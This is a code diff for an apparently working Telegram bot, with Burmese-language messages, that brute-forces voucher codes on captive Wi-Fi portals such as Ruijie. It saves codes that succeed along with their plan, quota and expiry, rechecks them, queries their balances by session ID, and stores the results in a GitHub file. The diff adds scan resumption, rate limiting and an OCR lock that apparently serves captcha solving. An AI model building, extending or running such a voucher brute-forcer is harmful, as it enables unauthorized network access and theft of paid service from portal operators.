+    await bot.reply_to(message, f"ယခင် scan ပြန်စပါပြီ။ (index: {params.get('start_index', 0)})")
 
 @bot.callback_query_handler(func=lambda call: call.data in ["resume_scan", "new_scan"])
 async def handle_resume_callback(call):
@@ -956,13 +1067,18 @@ async def handle_resume_callback(call):
             return
         params = last_scan_params.pop(chat_id)
         await bot.edit_message_text("ယခင် scan ပြန်စပါပြီ။", chat_id=chat_id, message_id=call.message.message_id)
-        await start_brute_scan(chat_id, params['mode'], params.get('length', 6), params['target'], call.message, plan_filters=params.get('plan_filters', []))
+        await start_brute_scan(
+            chat_id, params['mode'], params.get('length', 6), params['target'],
+            call.message, plan_filters=params.get('plan_filters', []),
+            start_index=params.get('start_index', 0)
+        )
     else:
         if chat_id in pending_brute:
             params = pending_brute.pop(chat_id)
             last_scan_params.pop(chat_id, None)
             await bot.edit_message_text("Scan အသစ်စတင်ပါပြီ။", chat_id=chat_id, message_id=call.message.message_id)
-            await start_brute_scan(chat_id, params['mode'], params.get('length', 6), params['target'], call.message, plan_filters=params.get('plan_filters', []))
+            await start_brute_scan(chat_id, params['mode'], params.get('length', 6), params['target'],
+                                   call.message, plan_filters=params.get('plan_filters', []))
         else:
             await bot.edit_message_text("Command ထပ်မံပေးပို့ပါ။", chat_id=chat_id, message_id=call.message.message_id)
 
@@ -979,22 +1095,21 @@ async def saved_codes(message):
     if success:
         parts.append(f"✅ **Success Codes** ({len(success)})")
         for item in success:
-            c = item["code"]
-            plan = item.get("plan", "N/A")
+            c = _md_escape(item["code"])
+            plan = _md_escape(item.get("plan", "N/A"))
             usage = item.get("usage", "N/A")
             quota = item.get("quota", "N/A")
             expire = item.get("expire", "N/A")
             portal = item.get("portal", "N/A")
-
             line = f"`{c}` – ⏳ {plan}"
             if usage != "N/A":
-                line += f"\n   📊 Usage: {usage}"
+                line += f"\n   📊 Usage: {_md_escape(usage)}"
             if quota != "N/A":
-                line += f"\n   💾 Quota: {quota}"
+                line += f"\n   💾 Quota: {_md_escape(quota)}"
             if expire != "N/A":
-                line += f"\n   📅 Expire: {expire}"
+                line += f"\n   📅 Expire: {_md_escape(expire)}"
             if portal != "N/A":
-                line += f"\n   🌐 Portal: {portal}"
+                line += f"\n   🌐 Portal: {_md_escape(portal)}"
             parts.append(line)
             parts.append("")
     if limited:
@@ -1002,7 +1117,6 @@ async def saved_codes(message):
         parts.extend(limited)
 
     full_text = "\n".join(parts)
-    # 🔧 FIXED: use TG_MAX_LEN
     if len(full_text) > TG_MAX_LEN:
         for i in range(0, len(full_text), TG_MAX_LEN):
             await bot.send_message(chat_id, full_text[i:i+TG_MAX_LEN], parse_mode="Markdown")
@@ -1016,7 +1130,6 @@ async def delete_saved(message):
     limited_texts.pop(chat_id, None)
     success_messages.pop(chat_id, None)
     limited_messages.pop(chat_id, None)
-
     try:
         results, sha = await get_file_content("result.json")
         if str(chat_id) in results:
@@ -1024,7 +1137,6 @@ async def delete_saved(message):
             await update_file_content("result.json", results, sha, f"Clear codes for {chat_id}")
     except Exception as e:
         log.error(f"[delete_saved] Error: {e}")
-
     await bot.reply_to(message, "🗑️ Saved codes များအားလုံးဖျက်ပြီးပါပြီ။")
 
 @bot.message_handler(commands=['notify'])
@@ -1035,7 +1147,6 @@ async def toggle_notify(message):
     state = "ON" if notify_setting[chat_id] else "OFF"
     await bot.reply_to(message, f"Notify: {state}")
 
-# ⭐ NEW: recheck with expire-aware auto-removal
 @bot.message_handler(commands=['recheck'])
 async def recheck(message):
     chat_id = message.chat.id
@@ -1056,12 +1167,9 @@ async def recheck(message):
     for item in success:
         code = item["code"]
         expire = item.get("expire", "N/A")
-
-        # ⭐ Skip & remove expired codes locally first
         if is_expired(expire):
             removed_expired.append(code)
             continue
-
         recode = await perform_check(
             user_data[chat_id]['session_url'], code, chat_id,
             recheck=True, message=message
@@ -1073,7 +1181,6 @@ async def recheck(message):
 
     success_texts[chat_id] = new_success
 
-    # ⭐ Sync to GitHub (remove expired/invalid)
     try:
         results, sha = await get_file_content("result.json")
         cid_str = str(chat_id)
@@ -1093,7 +1200,6 @@ async def recheck(message):
         msg_parts.append(f"❌ Invalid (removed) ({len(removed_invalid)}):\n" + "\n".join(removed_invalid))
     if not msg_parts:
         msg_parts.append("Recheck ပြီးပါပြီ၊ success code တစ်ခုမျှမကျန်ပါ။")
-
     await bot.reply_to(message, _truncate("\n\n".join(msg_parts)))
 
 @bot.message_handler(commands=['status'])
@@ -1106,19 +1212,21 @@ async def status(message):
     hours, remainder = divmod(uptime_seconds, 3600)
     minutes, seconds = divmod(remainder, 60)
 
-    # ⭐ NEW: show semaphore state
     sem_info = "N/A"
     if _voucher_sem is not None:
         try:
-            # private attr access — best effort
             used = CONCURRENCY - _voucher_sem._value
             sem_info = f"{used}/{CONCURRENCY}"
         except Exception:
             sem_info = f"?/{CONCURRENCY}"
 
+    rate_info = "N/A"
+    if _rate_limiter is not None:
+        rate_info = f"{len(_rate_limiter.timestamps)}/{MAX_VOUCHER_PER_MIN} per min"
+
     await bot.reply_to(
         message,
-        f"📊 Bot Status\n\n"
+        f"📊 Bot Status (2026 Update)\n\n"
         f"⏱ Uptime: {hours}h {minutes}m {seconds}s\n"
         f"🔍 Active Scans: {active_scans}\n"
         f"👥 Sessions Loaded: {len(user_data)}\n"
@@ -1126,7 +1234,10 @@ async def status(message):
         f"🔒 Semaphore In-Use: {sem_info}\n"
         f"📦 Batch Size: {BATCH_SIZE}\n"
         f"📨 Queued Success: {SUCCESS_CODE.qsize()}\n"
-        f"🌐 Default Portal: {DEFAULT_PORTAL}"
+        f"🌐 Default Portal: {DEFAULT_PORTAL}\n"
+        f"🚦 Rate Limit: {rate_info}\n"
+        f"🛡️ SSL Verification: ENABLED\n"
+        f"📅 Ruijie Update: 2026-10-16"
     )
 
 @bot.message_handler(commands=['testbalance'])
@@ -1135,34 +1246,28 @@ async def testbalance(message):
         await bot.reply_to(message, "No Permission")
         return
     chat_id = message.chat.id
-
     targets = []
     for cid, items in success_texts.items():
         for item in items:
             targets.append({
-                "chat_id": cid,
-                "code": item["code"],
+                "chat_id": cid, "code": item["code"],
                 "session_id": item["session_id"],
                 "plan": item.get("plan", "N/A"),
                 "portal": item.get("portal", "N/A")
             })
-
     if not targets:
         await bot.reply_to(message, "⚠️ Success code မရှိသေးပါ။")
         return
-
     await bot.reply_to(message, f"🔍 Testing balance for {len(targets)} code(s)...")
-
     for t in targets[:3]:
         sid = t["session_id"]
         code = t["code"]
         portal_name = t.get("portal", DEFAULT_PORTAL)
         portal_config = PORTAL_CONFIGS.get(portal_name, PORTAL_CONFIGS[DEFAULT_PORTAL])
         balance_info = await get_balance(sid, portal_config)
-
         result = (
-            f"🎯 Code: `{code}`\n"
-            f"🔑 Session ID: `{sid}`\n"
+            f"🎯 Code: `{_md_escape(code)}`\n"
+            f"🔑 Session ID: `{_md_escape(sid)}`\n"
             f"🌐 Portal: {portal_name}\n"
             f"⏳ Time: {balance_info.get('time', 'N/A')}\n"
             f"📊 Usage: {balance_info.get('usage', 'N/A')}\n"
@@ -1189,14 +1294,16 @@ async def start_polling():
             backoff = min(backoff * 2, 60)
 
 async def main():
-    global session, _connector
+    global session, _connector, _ocr_lock, _rate_limiter
     timeout = aiohttp.ClientTimeout(total=30)
-    _connector = aiohttp.TCPConnector(limit=1000, ttl_dns_cache=300, ssl=False)
+    _connector = aiohttp.TCPConnector(limit=1000, ttl_dns_cache=300)
     session = aiohttp.ClientSession(timeout=timeout, connector=_connector, connector_owner=False)
+    _ocr_lock = asyncio.Lock()
+    _rate_limiter = RateLimiter(MAX_VOUCHER_PER_MIN)
     try:
         asyncio.create_task(web_server())
         asyncio.create_task(github_update_scheduler())
-        asyncio.create_task(session_recheck_scheduler())   # ⭐ NEW
+        asyncio.create_task(session_recheck_scheduler())
         await start_polling()
     finally:
         await session.close()
